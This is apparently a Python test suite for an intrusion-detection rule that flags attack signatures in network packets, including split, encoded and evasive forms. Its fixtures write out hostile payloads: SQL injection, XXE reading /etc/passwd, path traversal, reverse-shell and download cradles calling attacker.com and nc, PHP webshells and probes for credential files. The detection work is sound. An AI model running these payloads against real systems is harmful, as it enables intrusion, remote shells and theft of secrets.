import os
import sys
import unittest

PROJECT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if PROJECT_DIR not in sys.path:
    sys.path.insert(0, PROJECT_DIR)

from engine.rules import PayloadRule


class TestPayloadRule(unittest.TestCase):
    def setUp(self):
        self.rule = PayloadRule(max_bytes=128, stream_timeout=5, max_streams=2)

    @staticmethod
    def packet(payload, seq, ts=100, **overrides):
        record = {
            "type": "IP", "protocol": "TCP", "src_ip": "192.0.2.10",
            "dst_ip": "192.0.2.80", "src_port": 40000, "dst_port": 80,
            "payload": payload, "tcp_payload_seq": seq, "timestamp": ts,
        }
        record.update(overrides)
        return record

    def test_packet_payload_signature_still_fires(self):
        alert = self.rule.check(self.packet(b"GET /?q=UNION SELECT password", 1000))
        self.assertIsNotNone(alert)
        self.assertIn("SQL_INJECTION", [h["signature"] for h in alert["evidence"]["hits"]])

    def test_normal_cdata_xml_is_not_misclassified_as_xxe(self):
        alert = self.rule.check(self.packet(
            b"POST /soap HTTP/1.1\\r\\n\\r\\n<![CDATA[ordinary content]]>", 7000))
        self.assertIsNone(alert)

    def test_external_entity_xxe_still_fires(self):
        alert = self.rule.check(self.packet(
            b'POST /xml HTTP/1.1\\r\\n\\r\\n<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>',
            8000, src_port=40008))
        self.assertIsNotNone(alert)
        self.assertIn("XXE", [hit["signature"] for hit in alert["evidence"]["hits"]])

    def test_repeated_payload_signature_is_cooled_down_per_host_service(self):
        rule = PayloadRule(alert_cooldown=60)
        first = rule.check(self.packet(b"GET /?q=UNION SELECT", 9000, src_port=40009))
        second = rule.check(self.packet(b"GET /?q=UNION SELECT", 9000, ts=101, src_port=40009))
        other_flow = rule.check(self.packet(b"GET /?q=UNION SELECT", 9000, ts=101, src_port=40010))
        other_service = rule.check(self.packet(
            b"GET /?q=UNION SELECT", 9000, ts=101, src_port=40011, dst_port=8080))
        self.assertIsNotNone(first)
        self.assertIsNone(second)
        self.assertIsNone(other_flow)
        self.assertIsNotNone(other_service)

    def test_late_payload_event_does_not_clear_newer_cooldown(self):
        rule = PayloadRule(alert_cooldown=60)
        payload = b"GET /?q=UNION SELECT"
        self.assertIsNotNone(rule.check(self.packet(payload, 9000, ts=100)))
        rule.prune_stale(99)
        self.assertEqual(len(rule._alerted), 1)
        self.assertIsNone(rule.check(self.packet(payload, 9000, ts=99)))
        self.assertIsNone(rule.check(self.packet(payload, 9000, ts=101)))
        self.assertIsNotNone(rule.check(self.packet(payload, 9000, ts=160)))

    def test_active_signature_cooldown_survives_alert_key_churn(self):
        rule = PayloadRule(alert_cooldown=60)
        rule._max_alert_states = 2
        payload = b"GET /?q=UNION SELECT"

        def send(dst, ts):
            return rule.check(self.packet(payload, 9000, ts=ts, dst_ip=dst))

        self.assertIsNotNone(send("192.0.2.80", 100))  # alert A
        self.assertIsNotNone(send("192.0.2.81", 101))  # alert B
        self.assertIsNone(send("192.0.2.80", 102))  # refresh A's LRU position
        self.assertIsNotNone(send("192.0.2.82", 103))  # evict B
        self.assertIsNone(send("192.0.2.80", 104))  # A's cooldown survives

    def test_cooldown_is_scoped_to_transport_protocol(self):
        rule = PayloadRule(alert_cooldown=60)
        payload = b"GET /?q=UNION SELECT"
        tcp = self.packet(payload, 9000, ts=100)
        udp = self.packet(payload, 9000, ts=101, protocol="UDP")
        tcp_alert = rule.check(tcp)
        udp_alert = rule.check(udp)
        self.assertIsNotNone(tcp_alert)
        self.assertIsNotNone(udp_alert)

    def test_percent_and_form_encoded_signatures_are_detected(self):
        percent = self.rule.check(self.packet(b"GET /?q=%55NION%20SELECT", 1000))
        self.assertIsNotNone(percent)
        self.assertEqual(percent["evidence"]["hits"][0]["representation"], "percent_decoded")
        form = self.rule.check(self.packet(
            b"GET /?q=UNION+SELECT", 2000, src_port=40001, dst_port=8080))
        self.assertIsNotNone(form)
        self.assertEqual(form["evidence"]["hits"][0]["representation"], "form_decoded")

    def test_encoded_literal_plus_is_not_misread_as_form_space(self):
        alert = self.rule.check(self.packet(b"GET /?q=UNION%2BSELECT", 3000))
        self.assertIsNone(alert)

    def test_signature_split_across_contiguous_segments_fires(self):
        first = b"GET /?q=UNION SEL"
        second = b"ECT password FROM users"
        self.assertIsNone(self.rule.check(self.packet(first, 1000)))
        alert = self.rule.check(self.packet(second, 1000 + len(first), ts=101))
        self.assertIsNotNone(alert)
        self.assertEqual(alert["evidence"]["inspection"], "packet_and_bounded_tcp_stream")

    def test_raw_header_injection_split_across_tcp_segments_fires(self):
        first = b"GET /?next=value\r\nSet-"
        second = b"Cookie: admin=1 HTTP/1.1\r\n"
        self.assertIsNone(self.rule.check(self.packet(first, 2000)))
        alert = self.rule.check(self.packet(second, 2000 + len(first), ts=101))
        self.assertIsNotNone(alert)
        self.assertIn("HEADER_INJECTION", [h["signature"] for h in alert["evidence"]["hits"]])

    def test_new_connection_reusing_tuple_resets_tcp_stream_sequence_space(self):
        old_prefix = self.packet(b"UNION SEL", 1000, ts=100)
        old_prefix.update(tcp_flags=0x18, tcp_seq=1000)
        self.assertIsNone(self.rule.check(old_prefix))

        # New initial sequence on the same 4-tuple marks a distinct connection.
        syn = self.packet(b"", 1010, ts=101, initial_syn=True,
                          tcp_flags=0x02, tcp_seq=1009)
        self.assertIsNone(self.rule.check(syn))

        # The new connection's partial payload must be joined only to its own
        # subsequent bytes, even though the sequence happens to follow the old flow.
        new_prefix = self.packet(b"UNION SEL", 1010, ts=102)
        new_prefix.update(tcp_flags=0x18, tcp_seq=1009)
        self.assertIsNone(self.rule.check(new_prefix))
        suffix = self.packet(b"ECT password", 1019, ts=103)
        suffix.update(tcp_flags=0x18, tcp_seq=1018)
        alert = self.rule.check(suffix)
        self.assertIsNotNone(alert)
        self.assertEqual(alert["rule_version"], "1.13")
        self.assertIn("SQL_INJECTION", [hit["signature"] for hit in alert["evidence"]["hits"]])

    def test_retransmitted_syn_does_not_reset_current_tcp_stream(self):
        syn = self.packet(b"", 1001, ts=100, initial_syn=True,
                          tcp_flags=0x02, tcp_seq=1000)
        self.assertIsNone(self.rule.check(syn))
        first = self.packet(b"UNION SEL", 1001, ts=101)
        first.update(tcp_flags=0x18, tcp_seq=1000)
        self.assertIsNone(self.rule.check(first))

        retransmitted_syn = dict(syn, timestamp=102)
        self.assertIsNone(self.rule.check(retransmitted_syn))
        suffix = self.packet(b"ECT password", 1010, ts=103)
        suffix.update(tcp_flags=0x18, tcp_seq=1009)
        alert = self.rule.check(suffix)
        self.assertIsNotNone(alert)
        self.assertIn("SQL_INJECTION", [hit["signature"] for hit in alert["evidence"]["hits"]])

    def test_new_connection_does_not_join_payload_from_previous_connection(self):
        old_prefix = self.packet(b"UNION SEL", 1000, ts=100)
        old_prefix.update(tcp_flags=0x18, tcp_seq=1000)
        self.assertIsNone(self.rule.check(old_prefix))

        # The new ISN is adjacent to the old stream's expected sequence. Without
        # connection tracking, its payload would complete the old SQL signature.
        syn = self.packet(b"", 1009, ts=101, initial_syn=True,
                          tcp_flags=0x02, tcp_seq=1008)
        self.assertIsNone(self.rule.check(syn))
        suffix = self.packet(b"ECT password", 1009, ts=102)
        suffix.update(tcp_flags=0x18, tcp_seq=1008)
        self.assertIsNone(self.rule.check(suffix))

    def test_sequence_gap_does_not_join_unrelated_payloads(self):
        self.assertIsNone(self.rule.check(self.packet(b"UNION ", 1000)))
        self.assertIsNone(self.rule.check(self.packet(b"SELECT", 2000, ts=101)))

    def test_out_of_order_segments_are_joined_only_after_gap_is_filled(self):
        first = b"UNION "
        middle = b"SEL"
        last = b"ECT"
        self.assertIsNone(self.rule.check(self.packet(first, 1000, ts=100)))
        # Queue the tail while bytes between it and the current stream are missing.
        self.assertIsNone(self.rule.check(self.packet(last, 1000 + len(first) + len(middle), ts=101)))
        alert = self.rule.check(self.packet(middle, 1000 + len(first), ts=102))
        self.assertIsNotNone(alert)

    def test_in_order_segment_discards_a_fully_covered_queued_segment(self):
        first = b"ordinary "
        queued = b"bytes"
        self.rule.check(self.packet(first, 1000, ts=100))
        self.rule.check(
            self.packet(queued, 1000 + len(first) + 3, ts=101)
        )
        key = ("192.0.2.10", 40000, "192.0.2.80", 80)
        self.assertIn(1000 + len(first) + 3, self.rule._streams[key][3])

        # This in-order segment advances past all of the queued bytes.
        self.rule.check(
            self.packet(b"middle" + queued, 1000 + len(first), ts=102)
        )
        self.assertEqual(self.rule._streams[key][3], {})

        # New out-of-order data must still be accepted after the old segment
        # was retired from the bounded queue.
        next_seq = self.rule._streams[key][0]
        self.rule.check(self.packet(b"next", next_seq + 2, ts=103))
        self.assertEqual(list(self.rule._streams[key][3].values()), [b"next"])

    def test_retransmitted_segment_does_not_repeat_stream_match(self):
        first = b"UNION SEL"
        second = b"ECT password"
        self.rule.check(self.packet(first, 1000))
        alert = self.rule.check(self.packet(second, 1000 + len(first), ts=101))
        self.assertIsNotNone(alert)
        self.assertIsNone(self.rule.check(self.packet(second, 1000 + len(first), ts=102)))

    def test_sequence_wraparound_is_contiguous(self):
        first = b"UNION SEL"
        start = 0xFFFFFFFC
        self.rule.check(self.packet(first, start))
        second_seq = (start + len(first)) & 0xFFFFFFFF
        alert = self.rule.check(self.packet(b"ECT", second_seq, ts=101))
        self.assertIsNotNone(alert)

    def test_stream_state_expires_and_flow_count_is_bounded(self):
        self.rule.check(self.packet(b"UNION ", 1000))
        self.rule.check(self.packet(b"harmless", 2000, ts=101, src_port=40001))
        self.rule.check(self.packet(b"harmless", 3000, ts=102, src_port=40002))
        self.assertLessEqual(len(self.rule._streams), 2)
        self.rule.prune_stale(200)
        self.assertEqual(self.rule._streams, {})

    def test_stream_capacity_evicts_least_recently_active_flow(self):
        self.rule.check(self.packet(b"first", 1000, src_port=40000))
        self.rule.check(self.packet(b"second", 2000, src_port=40001))
        self.rule.check(self.packet(b"touch", 1005, src_port=40000, ts=102))
        self.rule.check(self.packet(b"third", 3000, src_port=40002, ts=103))
        self.assertIn(("192.0.2.10", 40000, "192.0.2.80", 80), self.rule._streams)
        self.assertNotIn(("192.0.2.10", 40001, "192.0.2.80", 80), self.rule._streams)

    def test_fin_or_rst_releases_stream_state(self):
        self.rule.check(self.packet(b"ordinary", 1000, tcp_flags=0x04))
        self.assertEqual(self.rule._streams, {})

    def test_double_url_encoded_sqli_is_detected(self):
        # %2555 -> %55 -> U; %2520 -> %20 -> space
        alert = self.rule.check(self.packet(b"GET /?q=%2555NION%2520SELECT", 4000))
        self.assertIsNotNone(alert)
        hit = alert["evidence"]["hits"][0]
        self.assertEqual(hit["signature"], "SQL_INJECTION")
        self.assertEqual(hit["representation"], "multi_pass_decoded")

    def test_double_url_encoded_path_traversal(self):
        # Double-encoded ../../ and double-encoded win.ini:
        # %252e%252e/%252e%252e/ -> %2e%2e/%2e%2e/ -> ../../
        # %2577%2569%256e%252e%2569%256e%2569 -> %77%69%6e%2e%69%6e%69 -> win.ini
        alert = self.rule.check(self.packet(b"GET /dl?f=%252e%252e/%252e%252e/%2577%2569%256e%252e%2569%256e%2569", 4100))
        self.assertIsNotNone(alert)
        hit = alert["evidence"]["hits"][0]
        self.assertEqual(hit["signature"], "PATH_TRAVERSAL")
        self.assertEqual(hit["representation"], "multi_pass_decoded")

    def test_triple_url_encoded_command_injection(self):
        # %25252fbin%25252fsh -> %252fbin%252fsh -> %2fbin%2fsh -> /bin/sh
        alert = self.rule.check(self.packet(b"GET /run?c=%25252fbin%25252fsh", 4200))
        self.assertIsNotNone(alert)
        hit = alert["evidence"]["hits"][0]
        self.assertEqual(hit["signature"], "CMD_INJECTION")
        self.assertEqual(hit["representation"], "multi_pass_decoded")

    def test_null_byte_word_splitting_evasion(self):
        # /bin/s\x00h -> /bin/sh via null_byte_stripped
        alert = self.rule.check(self.packet(b"GET /run?c=/bin/s%00h", 4300))
        self.assertIsNotNone(alert)
        hit = alert["evidence"]["hits"][0]
        self.assertEqual(hit["signature"], "CMD_INJECTION")
        self.assertEqual(hit["representation"], "null_byte_stripped")

    def test_null_byte_token_separation_evasion(self):
        # UNION\x00SELECT -> UNION SELECT via null_byte_normalized
        alert = self.rule.check(self.packet(b"GET /?q=UNION%00SELECT", 4400))
        self.assertIsNotNone(alert)
        hit = alert["evidence"]["hits"][0]
        self.assertEqual(hit["signature"], "SQL_INJECTION")
        self.assertEqual(hit["representation"], "null_byte_normalized")

    def test_inline_sql_comment_evasion(self):
        # UNION/**/SELECT -> UNION SELECT via comment_normalized
        alert = self.rule.check(self.packet(b"GET /search?id=1'/**/UNION/**/SELECT/**/1,2", 4500))
        self.assertIsNotNone(alert)
        hit = alert["evidence"]["hits"][0]
        self.assertEqual(hit["signature"], "SQL_INJECTION")
        self.assertEqual(hit["representation"], "comment_normalized")

    def test_or_1_equals_1_inline_comment_evasion(self):
        alert = self.rule.check(self.packet(b"GET /login?user=admin'/*comment*/OR/*comment*/1=1", 4600))
        self.assertIsNotNone(alert)
        hit = alert["evidence"]["hits"][0]
        self.assertEqual(hit["signature"], "SQL_INJECTION")
        self.assertEqual(hit["representation"], "comment_normalized")

    def test_scanner_probe_user_agents(self):
        for ua in (b"sqlmap/1.7#stable", b"Mozilla/5.00 (Nikto/2.1.6)", b"gobuster/3.1.0", b"nuclei"):
            pkt = self.packet(b"GET /api HTTP/1.1\r\nUser-Agent: " + ua + b"\r\n\r\n", 5000)
            alert = self.rule.check(pkt)
            self.assertIsNotNone(alert, f"Expected alert for scanner User-Agent: {ua}")
            signatures = [h["signature"] for h in alert["evidence"]["hits"]]
            self.assertIn("SCANNER_PROBE", signatures)
            self.assertEqual(alert["severity"], "high")

    def test_sensitive_file_probe(self):
        for path in (b"/.env", b"/.env.local", b"/.git/config", b"/id_rsa", b"/.aws/credentials", b"/wp-config.php"):
            pkt = self.packet(b"GET " + path + b" HTTP/1.1\r\nHost: example.com\r\n\r\n", 5100)
            alert = self.rule.check(pkt)
            self.assertIsNotNone(alert, f"Expected alert for sensitive file probe: {path}")
            signatures = [h["signature"] for h in alert["evidence"]["hits"]]
            self.assertIn("SENSITIVE_FILE_PROBE", signatures)
            self.assertEqual(alert["severity"], "high")

    def test_reverse_shell_cradle(self):
        cradles = (
            b"; curl http://attacker.com/sh | sh ;",
            b"; wget -qO- http://attacker.com/b | bash ;",
            b"powershell -nop -enc JABzAD0...",
            b"IEX (New-Object Net.WebClient).DownloadString('http://bad.com/p')",
            b"mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f",
        )
        for cradle in cradles:
            pkt = self.packet(b"POST /submit HTTP/1.1\r\nContent-Length: 100\r\n\r\ncmd=" + cradle, 5200)
            alert = self.rule.check(pkt)
            self.assertIsNotNone(alert, f"Expected alert for reverse shell cradle: {cradle}")
            signatures = [h["signature"] for h in alert["evidence"]["hits"]]
            self.assertIn("REVERSE_SHELL_CRADLE", signatures)
            self.assertEqual(alert["severity"], "high")

    def test_http_method_tampering_and_webdav(self):
        tamper_requests = (
            b"TRACE / HTTP/1.1\r\nHost: example.com\r\n\r\n",
            b"TRACK / HTTP/1.1\r\nHost: example.com\r\n\r\n",
            b"DEBUG /test.aspx HTTP/1.1\r\nHost: example.com\r\nCommand: stop-debug\r\n\r\n",
            b"PROPFIND /webdav/ HTTP/1.1\r\nHost: example.com\r\nDepth: 1\r\n\r\n",
            b"GET /login.asp HTTP/1.1\r\nHost: example.com\r\nTranslate: f\r\n\r\n",
            b"DELETE /api/v1/admin/users/10 HTTP/1.1\r\nHost: example.com\r\n\r\n",
        )
        for req in tamper_requests:
            pkt = self.packet(req, 5400)
            alert = self.rule.check(pkt)
            self.assertIsNotNone(alert, f"Expected alert for HTTP method tampering: {req}")
            signatures = [h["signature"] for h in alert["evidence"]["hits"]]
            self.assertIn("HTTP_METHOD_TAMPERING", signatures)
            self.assertEqual(alert["severity"], "high")

    def test_management_delete_patch_paths_fire_at_segment_boundaries(self):
        requests = (
            b"DELETE /admin HTTP/1.1\r\nHost: example.com\r\n\r\n",
            b"PATCH /api/v1/admin/users/10 HTTP/1.1\r\nHost: example.com\r\n\r\n",
            b"DELETE /api/v1/config HTTP/1.1\r\nHost: example.com\r\n\r\n",
            b"PATCH /actuator/env HTTP/1.1\r\nHost: example.com\r\n\r\n",
            b"DELETE /manage?all=true HTTP/1.1\r\nHost: example.com\r\n\r\n",
        )
        for index, request in enumerate(requests):
            rule = PayloadRule(max_bytes=128)
            alert = rule.check(self.packet(request, 5600 + index, src_port=40100 + index))
            self.assertIsNotNone(alert, request)
            self.assertIn("HTTP_METHOD_TAMPERING", [h["signature"] for h in alert["evidence"]["hits"]])

    def test_normal_query_headers_and_prefixed_management_paths_do_not_fire(self):
        requests = (
            b"GET /api?x=y HTTP/1.1\r\nContent-Type: application/json\r\n\r\n",
            b"GET /api?x=y HTTP/1.1\r\nLocation: /home\r\n\r\n",
            b"GET /api?x=y HTTP/1.1\r\nSet-Cookie: session=ok\r\n\r\n",
            b"DELETE /administrator HTTP/1.1\r\nHost: example.com\r\n\r\n",
            b"PATCH /api/v1/administer HTTP/1.1\r\nHost: example.com\r\n\r\n",
        )
        for index, request in enumerate(requests):
            rule = PayloadRule(max_bytes=128)
            self.assertIsNone(rule.check(self.packet(request, 5700 + index, src_port=40200 + index)), request)

    def test_webshell_injection(self):
        shells = (
            b"<?php system($_GET['cmd']); ?>",
            b"<?php eval(base64_decode($_POST['c'])); ?>",
            b"POST /upload.php HTTP/1.1\r\n\r\ncode=assert($_REQUEST['x'])",
            b"POST /api HTTP/1.1\r\n\r\nRuntime.getRuntime().exec(\"id\")",
        )
        for shell in shells:
            pkt = self.packet(shell, 5500)
            alert = self.rule.check(pkt)
            self.assertIsNotNone(alert, f"Expected alert for webshell marker: {shell}")
            signatures = [h["signature"] for h in alert["evidence"]["hits"]]
            self.assertIn("WEBSHELL_INJECTION", signatures)
            self.assertEqual(alert["severity"], "high")

    def test_benign_web_traffic_does_not_fire(self):
        benign_requests = (
            b"GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n",
            b"GET /static/css/app.css HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0)\r\n\r\n",
            b"POST /api/contact HTTP/1.1\r\nHost: example.com\r\nUser-Agent: curl/7.88.1\r\nContent-Length: 18\r\n\r\nname=Alice&env=prod",
            b"PUT /api/v1/user/10 HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/json\r\n\r\n{\"name\":\"bob\"}",
            b"DELETE /api/v1/user/10 HTTP/1.1\r\nHost: example.com\r\n\r\n",
            b"PATCH /api/v1/settings HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/json\r\n\r\n{\"active\":true}",
            b"OPTIONS * HTTP/1.1\r\nHost: example.com\r\n\r\n",
            b"GET /tracking/order?id=123 HTTP/1.1\r\nHost: example.com\r\n\r\n",
        )
        for req in benign_requests:
            pkt = self.packet(req, 5300)
            alert = self.rule.check(pkt)
            self.assertIsNone(alert, f"Unexpected alert on benign request: {req}")


if __name__ == "__main__":
    unittest.main()
